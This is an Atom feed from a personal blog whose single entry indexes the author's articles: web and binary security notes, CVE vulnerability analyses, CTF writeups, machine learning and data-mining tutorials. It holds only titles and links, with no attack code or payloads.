<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Chybeta</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://chybeta.github.io/"/>
  <updated>2018-02-03T11:50:00.000Z</updated>
  <id>http://chybeta.github.io/</id>
  
  <author>
    <name>chybeta</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>一些文章</title>
    <link href="http://chybeta.github.io/3017/07/26/%E4%B8%80%E4%BA%9B%E6%96%87%E7%AB%A0/"/>
    <id>http://chybeta.github.io/3017/07/26/一些文章/</id>
    <published>3017-07-26T11:27:04.000Z</published>
    <updated>2018-02-03T11:50:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>一些自己写的文章。<br><a id="more"></a></p>
<h1 id="Project"><a href="#Project" class="headerlink" title="Project"></a>Project</h1><ul>
<li><a href="https://github.com/CHYbeta/cmsPoc" target="_blank" rel="external">cmsPoc:CMS渗透测试框架 </a></li>
<li><a href="https://github.com/CHYbeta/Web-Security-Learning" target="_blank" rel="external">Web-Security-Learning</a></li>
<li><a href="https://github.com/CHYbeta/Software-Security-Learning" target="_blank" rel="external">Software-Security-Learning</a></li>
<li><a href="https://github.com/CHYbeta/Code-Audit-Challenges" target="_blank" rel="external">Code-Audit-Challenges</a></li>
<li><a href="https://chybeta.gitbooks.io/the-path-to-machine-learning/content/" target="_blank" rel="external">The Path to Machine Learning</a></li>
<li><a href="https://book.ph0en1x.com/" target="_blank" rel="external">Awesome CTF Book</a></li>
<li><a href="https://chybeta.gitbooks.io/vuln-time/content/" target="_blank" rel="external">Vuln-Time</a></li>
</ul>
<h1 id="Web-Security"><a href="#Web-Security" class="headerlink" title="Web Security"></a>Web Security</h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><ul>
<li><a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">php文件包含漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">命令执行的一些绕过技巧</a></li>
<li><a href="https://chybeta.github.io/2017/07/26/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">php代码执行漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/07/21/MySql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/">MySql注入备忘录</a></li>
<li><a href="https://chybeta.github.io/2017/07/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%80%BB%E7%BB%93/">php代码审计小总结 </a></li>
<li><a href="https://chybeta.github.io/2017/07/04/%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/">小试XML实体注入攻击 </a></li>
<li><a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">浅谈php反序列化漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/05/13/%E5%88%A9%E7%94%A8PHP%E7%9A%84OPcache%E6%9C%BA%E5%88%B6getshell/">利用PHP的OPcache机制getshell</a></li>
</ul>
<h2 id="Vuln-Analysis"><a href="#Vuln-Analysis" class="headerlink" title="Vuln Analysis"></a>Vuln Analysis</h2><ul>
<li><a href="https://xianzhi.aliyun.com/forum/topic/1990" target="_blank" rel="external">阿里先知安全社区：Electron &lt; v1.8.2-beta.4 远程命令执行漏洞—【CVE-2018-1000006】</a></li>
<li><a href="https://xianzhi.aliyun.com/forum/topic/1983" target="_blank" rel="external">阿里先知安全社区：Smarty &lt;= 3.1.32 PHP代码执行漏洞分析—【CVE-2017-1000480】</a></li>
<li><a href="https://chybeta.github.io/2017/12/26/axublog-v1-0-6-%E4%B8%A4%E5%A4%84sql%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/">axublog v1.0.6 两处sql注入分析 </a></li>
<li><a href="https://chybeta.github.io/2017/12/17/AppCMS-2-0-101-%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/">AppCMS 2.0.101 后门分析 </a></li>
<li><a href="https://chybeta.github.io/2017/12/11/CVE-2016-7565-Exponent-CMS-2-3-9-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5-getshell%E5%88%86%E6%9E%90/">[CVE-2016-7565]Exponent CMS 2.3.9 配置文件写入 getshell分析</a></li>
<li><a href="https://chybeta.github.io/2017/11/01/Node-js%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%9ACVE-2017-5941/">Node.js中的反序列化漏洞：CVE-2017-5941 </a></li>
<li><a href="https://chybeta.github.io/2017/10/15/DiscuzX-v3-4-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/">DiscuzX v3.4 任意文件删除漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/09/12/ICMSv7-0-1-admincp-class-php-sql%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/">ICMSv7.0.1 admincp.class.php sql注入分析 </a></li>
<li><a href="https://chybeta.github.io/2017/08/04/%C2%96PHPCMS-v9-6-0-wap%E6%A8%A1%E5%9D%97sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">PHPCMS v9.6.0 wap模块sql注入漏洞分析</a></li>
<li><a href="https://chybeta.github.io/2017/07/22/PHPCMS-v9-6-0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">PHPCMS v9.6.0 任意文件上传漏洞分析 </a></li>
<li><a href="https://chybeta.github.io/2017/07/11/Catfish-%E9%B2%B6%E9%B1%BC-CMS-V-4-4-10-%E7%95%99%E8%A8%80%E6%9D%BF%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E/">Catfish(鲶鱼) CMS V 4.4.10 留言板存储型XSS漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/05/19/CVE-2017-8917-Joomla-3-7-0-SQL-Injection%E5%88%86%E6%9E%90/">[CVE-2017-8917]Joomla! 3.7.0 SQL Injection分析 </a></li>
<li><a href="https://chybeta.github.io/2017/05/12/CVE-2017-7991-Exponent-CMS-2-4-1-SQL-Injection%E5%88%86%E6%9E%90/">[CVE-2017-7991]Exponent CMS 2.4.1 SQL Injection分析 </a></li>
<li><a href="https://chybeta.github.io/2017/03/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%EF%BC%9ABlueCMSv1-6-sp1/">代码审计之SQL注入：BlueCMSv1.6 sp1 </a></li>
</ul>
<h1 id="Bin-Security"><a href="#Bin-Security" class="headerlink" title="Bin Security"></a>Bin Security</h1><ul>
<li><a href="https://chybeta.github.io/2017/10/19/Linux-kernel-development-1-%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/">Linux kernel development (1): 环境准备 </a></li>
<li><a href="https://chybeta.github.io/2017/08/14/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/">逆向学习笔记（一）</a></li>
<li><a href="https://chybeta.github.io/2017/08/09/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%88%A9%E7%94%A8%E9%80%9A%E7%94%A8gadget/#more">ROP学习：利用通用gadget </a></li>
<li><a href="https://chybeta.github.io/2017/06/26/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA/">ROP学习：64位栈溢出</a></li>
</ul>
<h1 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h1><ul>
<li><a href="https://chybeta.github.io/2017/07/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95%EF%BC%9A%E6%9C%80%E8%BF%91%E9%82%BB-KNN/">机器学习算法：最近邻(KNN)</a></li>
<li><a href="https://chybeta.github.io/2017/07/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95-%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron/">机器学习算法：感知机(perceptron) </a></li>
<li><a href="https://chybeta.github.io/2017/07/06/Tensorflow%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%B8%B8%E7%94%A8API/">Tensorflow学习：常用API</a></li>
<li><a href="https://chybeta.github.io/2017/03/15/win%E4%B8%8Btensorflow%E5%AE%89%E8%A3%85%E9%81%BF%E5%9D%91%E6%8C%87%E5%8D%97-0/">win下tensorflow安装避坑指南</a></li>
</ul>
<h1 id="数据挖掘"><a href="#数据挖掘" class="headerlink" title="数据挖掘"></a>数据挖掘</h1><ul>
<li><a href="https://chybeta.github.io/2017/01/22/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%880%EF%BC%89%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B9%8Banaconda%E5%AE%89%E8%A3%85/">数据挖掘比赛（0）环境搭建之anaconda安装</a></li>
<li><a href="https://chybeta.github.io/2017/01/24/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%881%EF%BC%89%E5%AF%B9%E6%97%A0%E5%88%97%E5%90%8D%E7%9A%84txt%E6%95%B0%E6%8D%AE%E9%9B%86%E8%AF%BB%E5%8F%96%E6%96%B9%E6%B3%95%E5%8F%8A%E5%A4%84%E7%90%86/">数据挖掘比赛（1）对无列名的txt数据集读取方法及处理</a></li>
<li><a href="https://chybeta.github.io/2017/01/25/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%882%EF%BC%89%E5%88%A9%E7%94%A8pandas%E8%AF%BB%E5%8F%96%E5%A4%A7%E5%9E%8B%E6%95%B0%E6%8D%AE%E9%9B%86/">数据挖掘比赛（2）利用pandas读取大型数据集</a></li>
<li><a href="https://chybeta.github.io/2017/01/29/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%883%EF%BC%89%E7%94%B3%E8%AF%B7anaconda-academic-license%E5%B9%B6%E4%BD%BF%E7%94%A8/">数据挖掘比赛（3）申请anaconda-academic-license并使用</a></li>
<li><a href="https://chybeta.github.io/2017/02/01/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%884%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8A/">数据挖掘比赛（4）ten Minutes to pandas中文版上 </a></li>
<li><a href="https://chybeta.github.io/2017/02/02/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%885%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8B/">数据挖掘比赛（5）ten Minutes to pandas中文版下</a></li>
</ul>
<h1 id="技术杂谈"><a href="#技术杂谈" class="headerlink" title="技术杂谈"></a>技术杂谈</h1><ul>
<li><a href="https://chybeta.github.io/2017/09/20/Flask-Web%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0-1-%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84/">Flask Web开发笔记(1):程序的基本结构 </a></li>
<li><a href="https://chybeta.github.io/2017/09/04/hexo-rss%E9%93%BE%E6%8E%A5%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95/">hexo-rss链接问题修复方法</a></li>
<li><a href="https://chybeta.github.io/2017/02/14/win%E4%B8%8BDocker%E9%BB%98%E8%AE%A4%E5%AD%98%E5%82%A8%E4%BD%8D%E7%BD%AE%E4%BF%AE%E6%94%B9/">win下Docker默认存储位置修改</a></li>
<li><a href="https://chybeta.github.io/2017/02/13/windows%E5%B9%B3%E5%8F%B0%E4%B8%8BDocker%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">windows平台下Docker环境搭建</a></li>
</ul>
<h1 id="编程练习"><a href="#编程练习" class="headerlink" title="编程练习"></a>编程练习</h1><ul>
<li><a href="https://chybeta.github.io/3017/06/19/ACM-OJ-%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0/">ACM-OJ[长期更新]</a></li>
<li><a href="https://chybeta.github.io/2017/08/12/hihoCoder-162%E5%91%A8%EF%BC%9A%E5%9B%9E%E6%96%87%E5%AD%97%E7%AC%A6%E4%B8%B2/">hihoCoder 162周：回文字符串 </a></li>
<li><a href="https://chybeta.github.io/2017/03/02/CodeTrain-3-%E6%95%B0%E7%BB%84%E5%8D%95%E8%B0%83%E5%92%8C/">CodeTrain(3)数组单调和</a></li>
<li><a href="https://chybeta.github.io/2017/03/02/CodeTrain-2-%E6%A3%8B%E5%AD%90%E7%BF%BB%E8%BD%AC/">CodeTrain(2)棋子翻转</a></li>
<li><a href="https://chybeta.github.io/2017/03/02/CodeTrain-1-%E6%9C%80%E5%A4%A7%E5%B7%AE%E5%80%BC/">CodeTrain(1)最大差值</a></li>
</ul>
<h1 id="随笔"><a href="#随笔" class="headerlink" title="随笔"></a>随笔</h1><ul>
<li><a href="https://chybeta.github.io/2017/02/17/%E8%AE%B02017%E5%B9%B4%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4%E4%B9%8B%E8%A1%8C/"> 记2017年阿里巴巴之行
</a></li>
</ul>
<h1 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><a href="https://xianzhi.aliyun.com/forum/topic/2013" target="_blank" rel="external">AceBear Security Contest-Tet Shopping-Writeup</a></li>
<li><a href="https://chybeta.github.io/2018/01/29/AceBear-Security-Contest-%E9%83%A8%E5%88%86Web-writeup/">AceBear Security Contest-部分Web-writeup</a></li>
<li><a href="https://chybeta.github.io/2018/01/23/Insomni-hack-teaser-2018-Smart-Y-writeup/">Insomni’hack teaser 2018-Smart-Y-writeup</a></li>
<li><a href="https://chybeta.github.io/2018/01/21/Insomni-hack-teaser-2018-VulnShop-writeup/">Insomni’hack teaser 2018-VulnShop-writeup</a></li>
<li><a href="https://chybeta.github.io/2018/01/18/%E8%B5%9B%E5%8D%9A%E5%9C%B0%E7%90%83%E6%9D%AF%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Web-writeup/">赛博地球杯工业互联网安全大赛-Web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/11/09/%E4%B8%80%E9%81%93CTF%E9%A2%98%EF%BC%9APHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">一道CTF题：PHP文件包含 </a></li>
<li><a href="https://chybeta.github.io/2017/11/04/HITCON-CTF-2017-BabyFirst-Revenge-writeup/">HITCON CTF 2017-BabyFirst Revenge-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/10/28/2017%E5%B9%B4%E7%99%BE%E8%B6%8A%E6%9D%AFAWD-web-writeup/">2017年百越杯AWD-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/10/22/Hack-lu-CTF-2017-Flatscience-writeup/">Hack.lu CTF 2017-Flatscience-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/10/05/Square-CTF-2017-Web-writeup/">Square CTF 2017-Web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/28/BackdoorCTF-2017-Extends-Me-writeup/">BackdoorCTF 2017-Extends Me-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/18/CSAW-CTF-2017-LittleQuery-writeup/">CSAW CTF 2017-LittleQuery-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/18/CSAW-CTF-2017-Shia-Labeouf-off-writeup/">CSAW CTF 2017-Shia Labeouf-off-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/09/18/CSAW-CTF-2017-Orange-v1-writeup/">CSAW CTF 2017-Orange v1-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/16/%E9%97%AE%E9%BC%8E%E6%9D%AF-CTF-writeup/">问鼎杯 CTF writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/14/SEC-T-CTF2017-Naughty-ads-writeup/">SEC-T CTF2017-Naughty ads-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/14/SEC-T-CTF2017-Sprinkler-system-writeup/">SEC-T CTF2017-Sprinkler system-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/11/ASISCTF2017-GSA-File-Server-writeup/">ASISCTF2017-GSA File Server-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/11/ASISCTF2017-Mathilda-writeup/">ASISCTF2017-Mathilda-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/09/08/WeChall-PHP-writeup/">WeChall-PHP-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/">TWCTF 2017-Super Secure Storage-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/09/02/TWCTF-2017-Freshen-Uploader-writeup/">TWCTF 2017-Freshen Uploader-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/31/ISG2017-wmwcms-writeup/">ISG2017-wmwcms-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/29/HITB-CTF-2017-Pasty-writeup/">HITB CTF 2017-Pasty-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/28/Hackit2017-H4ck3rM1nd-writeup/">Hackit2017-H4ck3rM1nd-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/28/Hackit2017-Weekands-of-hacker-writeup/">Hackit2017-Weekands of hacker-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/28/Hackit2017-V1rus3pidem1c-writeup/">Hackit2017-V1rus3pidem1c-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/28/Hackit2017-B3tterS0ci4lN3twork-writeup/">Hackit2017-B3tterS0ci4lN3twork-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/27/HackCon2017-Web-writeup/">HackCon2017-Web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/26/XNUCA2017-%E7%AC%AC%E4%B8%80%E6%9C%9F%EF%BC%9AWeb-writeup/">XNUCA2017-第一期：Web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-XSS-writeup/">XMAN夏令营-2017-XSS-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-%E6%AF%94%E8%B5%9B%E7%B3%BB%E7%BB%9F-writeup/">XMAN夏令营-2017-比赛系统-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/">XMAN夏令营-2017-babyweb-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-default-writeup/">XNUCA 2017-Web专题赛前指导-default-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E9%98%B3%E5%85%89%E6%80%BB%E5%9C%A8%E9%A3%8E%E9%9B%A8%E5%90%8E-writeup/">XNUCA 2017-Web专题赛前指导-阳光总在风雨后-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-Document-writeup/">XNUCA 2017-Web专题赛前指导-Document-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/17/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E6%9C%80%E5%AE%89%E5%85%A8%E7%9A%84%E7%AC%94%E8%AE%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-writeup/">XNUCA 2017-Web专题赛前指导-最安全的笔记管理系统-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/18/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-vote-writeup/">XNUCA 2017-Web专题赛前指导-vote-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/18/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-php%E6%98%AF%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80-writeup/">XNUCA 2017-Web专题赛前指导-php是最好的语言-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E9%83%A8%E5%88%86%E7%AE%80%E5%8D%95%E9%A2%98%E6%B1%87%E6%80%BB-writeup/">XNUCA 2017-Web专题赛前指导-部分简单题汇总-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/">SHACTF-2017-Web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-web-writeup/">BugsBunnyCTF2017-web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/24/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-writeup/">实验吧-web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/19/CTFZone-2017-Leaked-messages-writeup/">CTFZone-2017-Leaked messages-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-web-writeup/">XMAN选拔赛-2017-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/16/Meenpwn-2017-web-writeup/">Meenpwn-2017-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/15/%E4%B8%80%E9%81%93%E5%A5%BD%E7%8E%A9%E7%9A%84webshell%E9%A2%98/">一道好玩的webshell题 </a></li>
<li><a href="https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/">jarvisoj-web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/06/30/%C2%96ringzer0team-js-writeup/">ringzer0team-js-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/30/%C2%96ringzer0team-web-writeup/">ringzer0team-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/25/xss-quiz-writeup/">xss-quiz-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/19/GCTF-web-writeup/">GCTF-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/18/%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup/">“春秋杯”web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/01/12/%E5%8D%97%E9%82%AECTF%E5%B9%B3%E5%8F%B0web%E5%89%8D30%E9%A2%98%E8%A7%A3/">南邮CTF平台web前30题解</a></li>
</ul>
<h3 id="sqli-lab"><a href="#sqli-lab" class="headerlink" title="sqli-lab"></a>sqli-lab</h3><ul>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less17-writeup/">Sqli-Labs:Less17-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less15-16-writeup/">Sqli-Labs:Less15~16-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less13-14-writeup/">Sqli-Labs:Less13~14-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less11-12-writeup/">Sqli-Labs:Less11~12-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less8-10-writeup/">Sqli-Labs:Less8~10-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/12/Sqli-Labs-Less7-writeup/">Sqli-Labs:Less7-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/12/Sqli-Labs-Less5-6-writeup/">Sqli-Labs:Less5-6-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/04/02/Sqli-Labs-Less1-4-writeup/">Sqli-Labs:Less1-4-writeup</a></li>
</ul>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="CTF-1"><a href="#CTF-1" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><a href="https://chybeta.github.io/2017/09/09/TWCTF-2017-swap-writeup/">TWCTF 2017-swap-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/12/Codegate-2017-Qual-babypwn-writeup/">Codegate 2017 Qual-babypwn-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-pwn-writeup/">BugsBunnyCTF2017-pwn-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-pwn-writeup/">XMAN选拔赛-2017-pwn-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/06/29/XMAN-pwn-writeup/">XMAN-pwn-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/28/SUCTF-2016-pwn400-writeup/">SUCTF-2016-pwn400-writeup</a></li>
</ul>
<h3 id="pwnable-kr"><a href="#pwnable-kr" class="headerlink" title="pwnable.kr"></a>pwnable.kr</h3><ul>
<li><a href="https://chybeta.github.io/2017/08/01/Pwnable-kr-shellshock/">Pwnable.kr:shellshock</a></li>
<li><a href="https://chybeta.github.io/2017/08/01/Pwnable-kr-mistake/">Pwnable.kr:mistake</a></li>
<li><a href="https://chybeta.github.io/2017/06/18/%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup/">Pwnable.kr:random </a></li>
<li><a href="https://chybeta.github.io/2017/04/08/Pwnable-kr-passcode/">Pwnable.kr:passcode</a></li>
<li><a href="https://chybeta.github.io/2017/04/07/Pwnable-kr-bof/">Pwnable.kr:bof</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="https://chybeta.github.io/2017/10/07/CSAW-CTF-2017-MISC-writeup/">CSAW CTF 2017-MISC-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/11/ASISCTF2017-ASIS-secret-letter-writeup/">ASISCTF2017-ASIS secret letter-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/30/Hackit2017-Cypherpunk%E2%80%99s-nightmare-writeup/">Hackit2017-Cypherpunk’s nightmare-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/30/Hackit2017-USB-ducker-writeup/">Hackit2017-USB ducker-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/28/ISG2017-%E8%B5%9B%E5%89%8D%E7%BB%83%E6%89%8B%E9%A2%98%E2%80%94writeup/">ISG2017-赛前练手题—writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/27/HackCon2017-Steg-writeup/">HackCon2017-Steg-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Growing-Up-writeup/">SHACTF-2017-Growing Up-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-WannaFly-writeup/">SHACTF-2017-WannaFly-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-misc-writeup/">BugsBunnyCTF2017-misc-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/23/0ctf-2015-Peers-writeup/">0ctf-2015-Peers-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/17/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-misc-writeup/">XMAN选拔赛-2017-misc-writeup</a></li>
</ul>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><ul>
<li><a href="https://chybeta.github.io/2017/09/12/ASISCTF2017-Simple-Crypto-writeup/">ASISCTF2017-Simple Crypto-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-crypto-writeup/">BugsBunnyCTF2017-crypto-writeup</a></li>
<li><a href="Meenpwn-2017-crypto-writeup">Meenpwn-2017-crypto-writeup</a></li>
</ul>
<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><ul>
<li><a href="https://chybeta.github.io/2017/09/02/TWCTF-2017-Rev-Rev-Rev-writeup/">TWCTF 2017-Rev Rev Rev-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-Reverse-writeup/">BugsBunnyCTF2017-Reverse-writeup</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
